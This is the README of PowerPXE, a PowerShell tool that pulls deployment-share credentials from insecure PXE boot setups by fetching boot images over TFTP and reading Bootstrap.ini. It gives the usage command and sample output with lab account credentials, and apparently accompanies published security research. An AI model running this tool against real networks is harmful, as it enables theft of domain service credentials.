# PowerPXE
PowerPXE is a PowerShell script that extracts interesting data from insecure PXE boot.

The associated article was published in MISC n° 103 (in french).

# Quick Usage
Open an elevated PowerShell prompt :
```
Import-Module PowerPxe
Get-PXEcreds -InterfaceAlias Ethernet
```

The ouput should be :
```
    >> Get a valid IP adress
    >>> >>> DHCP proposal IP address: 192.168.22.101
    >>> >>> DHCP Validation: DHCPACK
    >>> >>> IP address configured: 192.168.22.101
    >> Request BCD File path
    >>> >>> BCD File path:  \Tmp\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd
    >>> >>> TFTP IP Address:  192.168.22.3
    >> Launch TFTP download
    >>>> Transfer succeeded.
    >> Parse the BCD file: conf.bcd
    >>>> Identify wim file : \Boot\x86\Images\LiteTouchPE_x86.wim
    >>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim
    >> Launch TFTP download
    >>>> Transfer succeeded.
    >> Open LiteTouchPE_x86.wim
    >>>> Finding Bootstrap.ini
    >>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
    >>>> >>>> UserID = MdtService
    >>>> >>>> UserDomain = lab.fr
    >>>> >>>> UserPassword = Somepass1
    >> Launch TFTP download
    >>>> Transfer succeeded.
    >> Open LiteTouchPE_x64.wim
    >>>> Finding Bootstrap.ini
    >>>> >>>> DeployRoot = \\LAB-MDT\DeploymentShare$
    >>>> >>>> UserID = MdtService
    >>>> >>>> UserDomain = lab.fr
    >>>> >>>> UserPassword = Somepass1
```

# Lab deployement

In order to test this module, the framework [AutomatedLab](https://github.com/AutomatedLab/AutomatedLab/) was used to automatically deploy a lab with Microsoft Deployment Toolkit (MDT) installed. The deployement script is present inside the "Labs" directory.

# Credits

I'd like to thank the following people for their work :
- **Thomas Elling** : [Attacks Against Windows PXE Boot Images](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)
- **Chris Dent** : [DHCP Discovery](https://www.indented.co.uk/dhcp-discovery/)
- **Valks**: [TFTP.NET implementation](https://github.com/Valks/tftp.net)
- **Matthew Graeber** : [BCD powershell module](https://github.com/mattifestation/BCD)